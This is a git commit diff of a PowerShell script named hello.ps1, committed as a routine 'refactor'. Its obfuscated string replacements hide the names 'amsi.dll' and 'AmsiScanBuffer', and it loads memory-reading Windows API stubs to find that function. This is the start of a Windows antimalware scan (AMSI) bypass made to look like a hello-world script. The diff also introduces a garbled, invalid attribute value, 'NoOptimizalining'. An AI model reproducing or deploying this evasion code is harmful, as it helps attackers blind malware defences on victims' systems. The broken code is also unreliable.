edeafe0955060f07ab382c66636092a8bce8173f
fvrsnr <155655459+fvrsnr@users.noreply.github.com>
2026-06-29 10:34:42 -0600

    Refactor PowerShell script and update API calls

--- hello.ps1
+++ hello.ps1
@@ -1,11 +1,9 @@
-# Define named parameters
-$InitialStart = 0x50000
-$NegativeOffset= 0x50000
-$MaxOffset = 0x4000000
-$ReadBytes = 0x50000
+$startOff = 0x50000
+$stepOff = 0x50000
+$maxOff = 0x4000000
+$bufSize = 0x50000
 
-
-$APIs = @"
+$srcCode = @"
 using System;
 using System.ComponentModel;
 using System.Management.Automation;
@@ -14,50 +12,50 @@ using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
 
-public class APIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+public class NtHelpers {
+    [DllImport("kernel32.dll", EntryPoint="ReadProcessMemory")]
+    public static extern bool ReadMem(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
 
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetCurrentProcess();
 
     [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
+
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
 
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-    public static int Dummy() {
-   	 return 1;
+    [MethodImpl(MethodImplOptions.NoOptimizalining)]
+    public static int Nop() {
+        return 1;
     }
 }
 "@
 
-Add-Type $APIs
+Add-Type $srcCode
 
-$InitialDate=Get-Date;
+$InitialDate = Get-Date
 
-$string = 'hello, world'
-$string = $string.replace('he','a')
-$string = $string.replace('ll','m')
-$string = $string.replace('o,','s')
-$string = $string.replace(' ','i')
-$string = $string.replace('wo','.d')
-$string = $string.replace('rld','ll')
+$s1 = 'hello, world'
+$s1 = $s1.replace('he','a')
+$s1 = $s1.replace('ll','m')
+$s1 = $s1.replace('o,','s')
+$s1 = $s1.replace(' ','i')
+$s1 = $s1.replace('wo','.d')
+$s1 = $s1.replace('rld','ll')
 
-$string2 = 'hello, world'
-$string2 = $string2.replace('he','A')
-$string2 = $string2.replace('ll','m')
-$string2 = $string2.replace('o,','s')
-$string2 = $string2.replace(' ','i')
-$string2 = $string2.replace('wo','Sc')
-$string2 = $string2.replace('rld','an')
+$s2 = 'hello, world'
+$s2 = $s2.replace('he','A')
+$s2 = $s2.replace('ll','m')
+$s2 = $s2.replace('o,','s')
+$s2 = $s2.replace(' ','i')
+$s2 = $s2.replace('wo','Sc')
+$s2 = $s2.replace('rld','an')
 
-$string3 = 'hello, world'
-$string3 = $string3.replace('hello','Bu')
-$string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace('world','er')
+$s3 = 'hello, world'
+$s3 = $s3.replace('hello','Bu')
+$s3 = $s3.replace(', ','ff')
+$s3 = $s3.replace('world','er')
 
-$Address = [APIS]::GetModuleHandle($string)
-[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
+$modBase = [NtHelpers]::GetModuleHandle($s1)
+[IntPtr] $funcAddr = [NtHelpers]::GetProcAddress($modBase, $s2 + $s3)
